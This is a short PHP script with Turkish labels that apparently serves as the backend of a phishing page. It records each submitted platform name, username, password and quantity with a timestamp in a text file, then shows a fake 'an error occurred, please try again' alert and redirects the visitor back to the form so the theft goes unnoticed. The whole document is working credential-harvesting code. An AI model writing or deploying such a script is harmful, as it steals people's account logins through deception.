<?php
    $data = date("Y-m-d H:i:s") . " | Platform: " . $_POST['platform'] . " | Kullanıcı: " . $_POST['kadi'] . " | Şifre: " . $_POST['sifre'] . " | Adet: " . $_POST['adet'] . " | Gönderim: " . ($_POST['gonderim'] ?? '') . "\n";
    file_put_contents("veriler.txt", $data, FILE_APPEND);
    echo "<script>alert('Bir hatayla karşılaştınız, lütfen tekrar deneyiniz.');window.location.href='index.html';</script>";
    ?>